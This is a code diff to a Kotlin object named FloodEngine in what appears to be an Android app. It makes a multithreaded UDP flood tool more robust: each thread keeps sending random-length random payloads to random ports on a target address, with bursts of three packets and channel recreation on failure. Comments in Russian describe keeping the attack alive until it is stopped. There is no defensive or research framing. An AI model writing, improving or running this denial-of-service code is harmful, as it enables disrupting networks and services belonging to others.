@@ -2,9 +2,10 @@ package com.twks.wifi
 
 import android.util.Log
 import kotlinx.coroutines.*
-import java.net.DatagramPacket
-import java.net.DatagramSocket
 import java.net.InetAddress
+import java.net.InetSocketAddress
+import java.nio.ByteBuffer
+import java.nio.channels.DatagramChannel
 import java.util.concurrent.atomic.AtomicLong
 import kotlin.random.Random
 
@@ -29,35 +30,47 @@ object FloodEngine {
 
         for (i in 0 until threads) {
             jobScope.launch {
+                val random = Random(System.nanoTime() + i)
                 var localCount = 0L
-                var socket: DatagramSocket? = null
-                try {
-                    socket = DatagramSocket()
-                    socket.reuseAddress = true
-                    socket.sendBufferSize = 4194304
-                    socket.trafficClass = 0x10
 
-                    val random = Random(System.nanoTime() + i)
+                // самовосстановление: поток живет до стопа, канал пересоздается при сбое
+                while (isAttacking && currentCoroutineContext().isActive) {
+                    var channel: DatagramChannel? = null
+                    try {
+                        channel = DatagramChannel.open()
+                        channel.configureBlocking(false)
+                        try { channel.socket().sendBufferSize = 4194304 } catch (e: Exception) {}
+                        try { channel.socket().trafficClass = 0x10 } catch (e: Exception) {}
 
-                    while (isAttacking) {
-                        val len = random.nextInt(512, 1401)
-                        val payload = ByteArray(len).apply { random.nextBytes(this) }
-                        // залп из 3 пакетов за цикл: x3 к скорости без новых потоков
-                        repeat(3) {
-                            val port = random.nextInt(1024, 65535)
-                            val packet = DatagramPacket(payload, payload.size, address, port)
-                            socket.send(packet)
-                            localCount++
+                        while (isAttacking) {
+                            val len = random.nextInt(512, 1401)
+                            val payload = ByteArray(len).apply { random.nextBytes(this) }
+                            var stalled = false
+
+                            repeat(3) {
+                                val port = random.nextInt(1024, 65535)
+                                val sent = try {
+                                    channel.send(ByteBuffer.wrap(payload), InetSocketAddress(address, port))
+                                } catch (e: Exception) {
+                                    -1
+                                }
+                                if (sent > 0) localCount++ else stalled = true
+                            }
+
+                            if (localCount >= 1000) {
+                                packetCount.addAndGet(localCount)
+                                localCount = 0L
+                            }
+                            // очередь ядра полна: отступаем, но не умираем
+                            if (stalled) delay(2)
                         }
-                        if (localCount >= 1000) {
-                            packetCount.addAndGet(localCount)
-                            localCount = 0L
-                        }
+                    } catch (e: Exception) {
+                        delay(50)
+                    } finally {
+                        packetCount.addAndGet(localCount)
+                        localCount = 0L
+                        try { channel?.close() } catch (e: Exception) {}
                     }
-                } catch (e: Exception) {
-                } finally {
-                    packetCount.addAndGet(localCount)
-                    socket?.close()
                 }
             }
         }
